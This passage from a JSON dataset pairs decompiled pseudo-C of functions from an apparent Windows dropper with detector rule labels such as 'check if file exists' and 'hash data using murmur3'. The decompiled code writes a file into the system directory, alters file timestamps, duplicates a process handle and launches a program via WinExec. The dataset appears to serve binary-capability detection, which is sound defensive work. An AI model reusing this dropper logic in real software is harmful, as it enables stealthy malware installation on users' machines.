fcn.00401380(puVar13[5], puVar13[6], puVar13[7], puVar13[8]);\n    if (!bVar20 && cVar24 == cVar21) {\n        *(puVar13 + 0x12) = uVar16;\n        uVar16 = uVar16 & 0xffff0000 | *(puVar13 + 0x12);\n    }\n    puVar13[4] = 0x14;\n    puVar13[3] = 0x4112bc;\n    puVar13[2] = 0x14;\n    puVar13[1] = 0x407010;\n    *puVar13 = 0x404881;\n    fcn.00401380(puVar13[1], puVar13[2], puVar13[3], puVar13[4]);\n    if ((bVar20 || cVar24 != cVar21) || (puVar14 = puVar13 + 1,  !bVar20 && cVar24 == cVar21)) {\n        *puVar13 = 0x33;\n        puVar14 = puVar13;\n    }\n    puVar14[-1] = 0x4112d0;\n    puVar14[-2] = 0x14;\n    puVar14[-3] = 0x407010;\n    puVar14[-4] = 0x4048a2;\n    uVar25 = fcn.00401380(puVar14[-3], puVar14[-2], puVar14[-1], *puVar14);\n    puVar14[0xc] = uVar25;\n    puVar14[0xb] = uVar25 >> 0x20;\n    uVar7 = uVar28 + 0x2562;\n    uVar19 = 0;\n    uVar10 = uVar7 & 0xffffff00 | uVar7 | 0x4c | extraout_ECX_06;\n    uVar23 = uVar10 == 0;\n    bVar20 = (POPCOUNT(uVar10 & 0xff) & 1U) == 0;\n    puVar14[0xc] = 10;\n    puVar14[0xb] = 0x411304;\n    puVar14[10] = 0x14;\n    puVar14[9] = 0x407010;\n    puVar14[8] = 0x4048d4;\n    fcn.00401380(puVar14[9], puVar14[10], puVar14[0xb], puVar14[0xc]);\n    if (!bVar20) {\n        *(puVar14 + 0x22) = extraout_CX_01;\n    }\n    puVar14[8] = 4;\n    puVar14[7] = 0x411310;\n    puVar14[6] = 0x14;\n    puVar14[5] = 0x407010;\n    puVar14[4] = 0x4048f1;\n    fcn.00401380(puVar14[5], puVar14[6], puVar14[7], puVar14[8]);\n    puVar15 = puVar14 + 5;\n    if ((!uVar19 && !uVar23) && (puVar15 = puVar14 + 5,  uVar19 || uVar23)) {\n        puVar15 = puVar14 + 6;\n    }\n    puVar15[-1] = 5;\n    puVar15[-2] = 0x411314;\n    puVar15[-3] = 0x14;\n    puVar15[-4] = 0x407010;\n    puVar15[-5] = 0x404915;\n    fcn.00401380(puVar15[-4], puVar15[-3], puVar15[-2], puVar15[-1]);\n    puVar15[7] = extraout_ECX_07;\n    puVar15[7] = 6;\n    puVar15[6] = 0x41131c;\n    puVar15[5] = 0x14;\n    puVar15[4] = 0x407010;\n    puVar15[3] = 0x404940;\n    fcn.00401380(puVar15[4], puVar15[5], puVar15[6], puVar15[7]);\n    puVar15[7] = extraout_ECX_08;\n    puVar15[7] = 0x2a;\n    puVar15[6] = 0x411350;\n    puVar15[5] = 0x14;\n    puVar15[4] = 0x407010;\n    puVar15[3] = 0x404963;\n    uVar25 = fcn.00401380(puVar15[4], puVar15[5], puVar15[6], puVar15[7]);\n    puVar15[7] = uVar25;\n    puVar15[6] = extraout_ECX_09;\n    puVar15[5] = uVar25 >> 0x20;\n    puVar15[4] = uVar11;\n    puVar15[3] = puVar15 + 8;\n    puVar15[2] = 0x6ae181d0;\n    puVar15[1] = uVar16;\n    *puVar15 = uVar28;\n    puVar15[7] = 0xb;\n    puVar15[6] = 0x41137c;\n    puVar15[5] = 0x14;\n    puVar15[4] = 0x407010;\n    puVar15[3] = 0x404995;\n    uVar28 = fcn.00401380(puVar15[4], puVar15[5], puVar15[6], puVar15[7]);\n    return uVar28;\n}\n",
        "token_count": 5507
    },
    "004011c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040136c) overlaps instruction at (ram,0x0040136b)\n// \n// WARNING: Removing unreachable block (ram,0x0040136c)\n\nint32_t fcn.004011c0(void)\n\n{\n    int32_t **arg_ch;\n    uint arg_8h;\n    char cVar1;\n    uint32_t arg_10h;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    int32_t *arg_18h;\n    uint *puVar3;\n    uchar *puVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uchar uVar7;\n    char cVar8;\n    uchar auStack556 [264];\n    uint auStack292 [2];\n    uint uStack8;\n    \n    puVar6 = &stack0xfffffffc;\n    uVar7 = &stack0xfffffffc < 0x10c;\n    cVar8 = *0x10 == 0x110;\n    puVar4 = &stack0xfffffffc;\n    if ((!cVar8) && (puVar4 = &stack0xfffffffc,  cVar8)) {\n        puVar3 = 0xfffffff0;\n        puVar4 = 0xfffffff0;\n        cVar1 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar3 = puVar3 + -1;\n            *puVar3 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    piVar5 = *(puVar4 + 0x20);\n    iVar2 = *(puVar4 + 8);\n    arg_ch = *(puVar4 + 0x1c);\n    while( true ) {\n        arg_8h = *(puVar4 + 0x18);\n        fcn.004036e0(arg_8h, arg_ch, iVar2, 0x20, piVar5 + 8);\n        if ((uVar7) || (!uVar7)) break;\n        iVar2 = extraout_ECX + -1;\n        if (iVar2 == 0 || cVar8 == '\\0') {\n            iVar2 = *piVar5;\n            *arg_ch = piVar5 + 1;\n            arg_18h = iVar2 >> 0x1f;\n            piVar5 = 0x8bb8ec44;\n            puVar4 = puVar4 + 1;\n            arg_10h = *0x9750e2b5 | 0x8d;\ncode_r0x00401214:\n            fcn.004036e0(arg_8h, arg_ch, arg_10h, 0x20, arg_18h);\n            fcn.004036e0(arg_8h, arg_ch, *(puVar4 + 0x10), 0x20, piVar5 + 0x28);\n            fcn.004036e0(arg_8h, arg_ch, *(puVar4 + 0x14), 0x20, piVar5 + 0x38);\n            iVar2 = fcn.00401170();\n            if (iVar2 == -1) {\n                iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                *(piVar5 + 0x48) = iVar2 % 5;\n            }\n            else {\n                *(piVar5 + 0x48) = iVar2;\n            }\n            puVar4[-0x10c] = 0;\n            puVar6 = puVar4 + -0x10b;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar4 + -4) = 0x104;\n            *(puVar6 + 2) = 0;\n            iVar2 = fcn.004041c0(0x80000001, 0x411350, 0x41137c, puVar4 + -8, puVar4 + -0x10c, puVar4 + -4);\n            if (iVar2 != 0) {\n                iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar4 + -0x10c, 0x4113cc);\n                if (iVar2 == 0) {\n                    if ((-1 < iVar2) && (-1 >= iVar2)) {\n                        out(0xc4, 0);\n                        *(puVar6 + 3) = 0;\n                    }\n                    iVar2 = *(puVar4 + 0x20);\n                    *(iVar2 + 0x120) = *(iVar2 + 0x120) | 0x80;\n                }\n            }\n            return iVar2;\n        }\n    }\n    arg_10h = *(puVar4 + 0xc);\n    arg_18h = piVar5 + 0x18;\n    goto code_r0x00401214;\n}\n",
        "token_count": 1133
    },
    "004014a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004015d1) overlaps instruction at (ram,0x004015d0)\n// \n\nuint __cdecl fcn.004014a0(uint arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *extraout_ECX;\n    uint *extraout_ECX_00;\n    uint *puVar6;\n    ushort extraout_DX;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint *puVar10;\n    bool bVar11;\n    unkbyte6 Var12;\n    uchar uVar13;\n    ushort uStack596;\n    ushort uStack594;\n    ushort uStack592;\n    ushort uStack590;\n    uchar uStack588;\n    uchar uStack587;\n    ushort uStack586;\n    char *pcStack584;\n    uint uStack580;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint *var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar6 = &var_22fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_12ch = '\\0';\n    puVar6 = &var_12bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    pcStack584 = &lpBuffer;\n    uStack580 = 0x104;\n    *(puVar6 + 2) = 0;\n    uStack588 = 0xf6;\n    uStack587 = 0x14;\n    uStack586 = 0x40;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar4 = 0xffffffff;\n    pcVar8 = &lpBuffer;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar6 = pcVar7 + -uVar4;\n    puVar10 = &var_12ch;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar4 = 0xffffffff;\n    pcVar8 = 0x411140;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar8 = &var_12ch;\n    do {\n        pcVar9 = pcVar8;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar9 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar9;\n    } while (cVar1 != '\\0');\n    puVar6 = pcVar7 + -uVar4;\n    puVar10 = pcVar9 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uStack588 = SUB41(&var_28h, 0);\n    uStack587 = &var_28h >> 8;\n    uStack586 = &var_28h >> 0x10;\n    uStack592 = 0;\n    uStack590 = 0;\n    uStack596 = SUB42(&var_12ch, 0);\n    uStack594 = &var_12ch >> 0x10;\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n    Var12 = CONCAT24(extraout_DX, var_4h);\n    bVar11 = arg_ch == 0xffffffff;\n    puVar6 = extraout_ECX;\n    if (bVar11) {\n        Var12 = fcn.00402a10(arg_8h);\n        bVar11 = Var12 == -1;\n        puVar6 = extraout_ECX_00;\n        if (bVar11) {\n            return 0;\n        }\n    }\n    if ((bVar11) || (uVar13 = SUB41(arg_ch, 0),  !bVar11)) {\n        uVar13 = 0xe8;\n        puVar6 = &var_1ch;\n    }\n    else {\n        uVar2 = in(Var12 >> 0x20);\n        *arg_ch = uVar2;\n        arg_ch = arg_ch + 1;\n        if (&uStack596 < 1) {\n            if (*0x10 != 0x255) {\n                return 0;\n            }\n            return 1;\n        }\n    }\n    in(0x50);\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(Var12, &var_24h, puVar6, uVar13);\n    if (arg_ch == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(Var12);\n    }\n    return 1;\n}\n",
        "token_count": 1585
    },
    "00401670": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00401670(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint lpCreationTime;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint *puStack24;\n    uint uStack20;\n    \n    uStack20 = filename;\n    puStack24 = 0x401683;\n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 1) || (0 < iVar1)) {\n        uStack20 = nitems;\n        puStack24 = 0x1;\n        iStack28 = ptr;\n        iStack32 = 0x4016b3;\n        (*_sym.imp.MSVCRT.dll_fwrite)();\n        uStack36 = 0x4016c4;\n        iStack32 = iVar1;\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        uStack20 = 0x4016da;\n        (*_sym.imp.MSVCRT.dll_fclose)();\n        return 1;\n    }\n    if (extraout_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (9 < (iVar1 & 0xf) | in_AF || iVar1 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    in(0x50);\n    puStack24 = &fcn.00401670::lpCreationTime;\n    iStack32 = 0x4015e4;\n    iStack28 = iVar1;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)();\n    if (unaff_EDI == -1) {\n        uStack36 = 0x4015f0;\n        iStack32 = iVar1;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 482
    },
    "00401600": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00401600(uint arg_8h)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    bool in_CF;\n    \n    if (!in_CF) {\n        if (in_CF) {\n            if (&stack0xfffffff8 < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            in(0x50);\n            (*_sym.imp.KERNEL32.dll_SetFileTime)();\n            if (unaff_EDI == -1) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            return 1;\n        }\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)();\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 210
    },
    "00402ab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00402ab0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.004041c0(0x80000002, 0x4113e8, 0x411428, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 152
    },
    "00402d00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402ed0) overlaps instruction at (ram,0x00402ecc)\n// \n// WARNING: Removing unreachable block (ram,0x00402d47)\n// WARNING: Removing unreachable block (ram,0x00402d50)\n// WARNING: Removing unreachable block (ram,0x00402e12)\n// WARNING: Removing unreachable block (ram,0x00402e14)\n// WARNING: Removing unreachable block (ram,0x00402df7)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00402d00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uchar **ppuVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t extraout_CL;\n    int32_t iVar7;\n    uint *extraout_ECX;\n    uint *puVar8;\n    uint *extraout_EDX;\n    uint *arg_8h_00;\n    int32_t *piVar9;\n    uint *puVar10;\n    uchar uVar11;\n    bool bVar12;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var13;\n    unkbyte10 extraout_ST0_01;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    ulong uVar16;\n    uchar *puStack24719;\n    uint uStack24715;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &stack0xfffffffc;\n    lpBuffer = 0;\n    puVar8 = &var_213h;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    uVar11 = 1;\n    s = 0;\n    puVar8 = &var_10fh;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    var_ch = 1;\n    *(puVar8 + 2) = 0;\n    puStack24719 = &lpBuffer;\n    uStack24715 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((uVar11) || (puVar8 = extraout_ECX,  arg_8h_00 = extraout_EDX,  !uVar11)) {\n        puVar8 = &var_8h;\n        arg_8h_00 = &var_4h;\n    }\n    fcn.00402680(arg_8h_00, puVar8);\n    iVar7 = fcn.00403310(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar7 == 0) {\n        return 0;\n    }\n    pcVar4 = fcn.00403c60(&s, var_4h, var_8h);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    if ((pcVar4 < 1) || (0 < pcVar4)) {\n        fcn.00404fb0();\ncode_r0x00402e38:\n        pcVar4 = fcn.00403a90(0x411160);\n    }\n    else {\n        puVar1 = pcVar4 + -0x17c625aa;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        if (-1 < *puVar1) {\n            *pcVar4 = *pcVar4 + pcVar4;\n            goto code_r0x00402e38;\n        }\n    }\n    if (pcVar4 == 0xffffffff) {\n        uVar14 = fcn.00403a90(0x411154);\n        iVar7 = uVar14;\n        bVar12 = SBORROW4(iVar7, -1);\n        uVar6 = iVar7 + 1;\n        Var13 = extraout_ST0;\n        if (iVar7 == -1) goto code_r0x00402ebb;\n    }\n    uVar15 = fcn.00401930(arg_8h);\n    uVar14 = uVar15 & 0xffffffff00000000 | *0x4235a8;\n    if (uVar15 != 0) {\n        fcn.004016f0();\n        fcn.004041b0();\n        return 1;\n    }\n    bVar12 = false;\n    Var13 = extraout_ST0_00;\n    uVar6 = *0x4235a8;\n    if (*0x4235a8 == 0) {\n        return 0;\n    }\ncode_r0x00402ebb:\n    piVar9 = uVar14 >> 0x20;\n    if ((bVar12 == uVar6 < 0) && (bVar12 != uVar6 < 0)) {\n        *(uVar14 + -0x7ce92414) = Var13;\n        *piVar9 = *piVar9 + -0x6a72207c;\n        LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar7 = fcn.004019d0(arg_8h, &s);\n    uVar6 = var_ch;\n    if (iVar7 == 0) {\n        uVar6 = 0;\n    }\n    bVar12 = uVar6 < 0;\n    if (uVar6 != 0) {\n        uVar5 = fcn.00403800(arg_8h);\n        bVar12 = uVar5 < 0;\n        if (uVar5 == 0) {\n            var_ch = 0;\n            uVar6 = uVar5;\n        }\n    }\n    if (((!bVar12) && (bVar12)) || (bVar12 = false,  uVar6 == 0)) {\n        uVar6 = fcn.00402720(arg_8h, uVar6);\n        bVar12 = 0xfffffff7 < &stack0xffff9f69;\n        var_ch = uVar6;\n    }\n    if ((!bVar12) && (bVar12)) {\n        func_0x10188eb7();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    ppuVar3 = uVar6;\n    if (uVar6 != 0) {\n        fcn.004041b0();\n        ppuVar3 = &puStack24719;\n    }\n    bVar12 = (POPCOUNT(ppuVar3 & 0xff) & 1U) != 0;\n    if ((bVar12) && (!bVar12)) {\n        puVar8 = &stack0xffff9f6d;\n        cVar2 = '\\x1e';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar10;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    uVar16 = (*_sym.imp.KERNEL32.dll_Sleep)();\n    piVar9 = uVar16 >> 0x20;\n    *(uVar16 + -0x7ce92414) = extraout_ST0_01;\n    *piVar9 = *piVar9 + 0x6adf84;\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return uVar6;\n}\n",
        "token_count": 1845
    },
    "00403a90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403ae1)\n\nuint __cdecl fcn.00403a90(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x423598)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x42359c)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x00403b65:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00403b65;\n        }\n        iVar3 = (**0x4235a0)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 378
    },
    "00403b80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403b80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.00403a90(0x411174);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 222
    },
    "00403c60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d48) overlaps instruction at (ram,0x00403d47)\n// \n\nuint __cdecl fcn.00403c60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *arg_ch_00;\n    int32_t iVar1;\n    uint *unaff_EDI;\n    bool bVar2;\n    uint *arg_8h_00;\n    uint var_4h;\n    \n    *0x4235a8 = fcn.00402ab0();\n    arg_ch_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_ch_00 == 0xffffffff) {\n        return 0;\n    }\n    arg_8h_00 = arg_ch_00;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_ch_00, arg_ch, arg_10h, &var_4h, 0);\n    if (iVar1 != 0) {\n        bVar2 = false;\n        if (*0x4235a8 != 0) {\n            unaff_EDI = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n            iVar1 = fcn.00403b80(arg_8h_00);\n            bVar2 = SCARRY4(-(iVar1 != 0), 1);\n            *0x4235a8 = -(iVar1 != 0) + 1;\n        }\n        if ((!bVar2) && (bVar2)) {\n            *unaff_EDI = *arg_ch_00;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        fcn.004014a0(0, arg_ch_00);\n        if (*0x4235a8 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_ch_00);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 472
    },
    "00404340": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404367) overlaps instruction at (ram,0x00404365)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00404340(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    \n    iVar2 = fcn.00402a10(0x411108);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar2 == -1) {\n        return 0;\n    }\n    *((*0x10 ^ *(unaff_EBX + 0x50)) - 4) = 0x40436e;\n    (*pcVar1)();\n    return 1;\n}\n",
        "token_count": 166
    },
    "00401410": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401476) overlaps instruction at (ram,0x00401474)\n// \n\nint32_t __cdecl fcn.00401410(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint16_t in_DX;\n    char *unaff_EBX;\n    \n    uVar3 = in_DX;\n    if (arg_10h != 0) {\n        do {\n            cVar2 = uVar3;\n            arg_8h = arg_8h + *arg_ch;\n            uVar3 = arg_8h >> 0x10;\n            if (arg_8h >> 0x10 == 0) {\ncode_r0x00401485:\n                arg_ch = arg_ch + 1;\n            }\n            else if ((arg_8h < 0) || (arg_8h >= 0)) {\n                uVar3 = uVar3 + (arg_8h & 0xffff);\n                arg_8h = uVar3;\n                goto code_r0x00401485;\n            }\n            *(arg_8h + 0xffffe1) = *(arg_8h + 0xffffe1) + cVar2;\n            *unaff_EBX = *unaff_EBX + cVar2;\n            puVar1 = unaff_EBX + 0x2c683c8;\n            *puVar1 = *puVar1 >> 0xf | *puVar1 << 0x11;\n        } while (*unaff_EBX != '\\0');\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 392
    },
    "00403440": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403554) overlaps instruction at (ram,0x00403552)\n// \n// WARNING: Removing unreachable block (ram,0x0040352b)\n\nvoid __cdecl fcn.00403440(uint arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    int32_t iVar7;\n    char *unaff_EDI;\n    char *pcVar8;\n    char *pcVar9;\n    char in_ES;\n    uint var_4h;\n    \n    uVar4 = fcn.00401410(0, arg_8h, arg_ch + 1U >> 1);\n    uVar4 = uVar4 & 0xffff;\n    uVar5 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    cVar2 = arg_8h;\n    pcVar1 = *(uVar5 + 0x58);\n    if (uVar4 < pcVar1) {\n        iVar7 = (uVar4 - pcVar1 & 0xffff) - 1;\n        pcVar9 = pcVar1;\n    }\n    else {\n        iVar7 = uVar4 - (pcVar1 & 0xffff);\n        pcVar9 = pcVar1 & 0xffff;\n    }\n    uVar4 = pcVar1 >> 0x10;\n    uVar3 = pcVar1 >> 0x10;\n    uVar6 = iVar7;\n    if (uVar6 < uVar3) {\n        if ((uVar3 <= uVar6) && (uVar6 < uVar3)) {\n            iVar7 = iVar7 + -1;\n            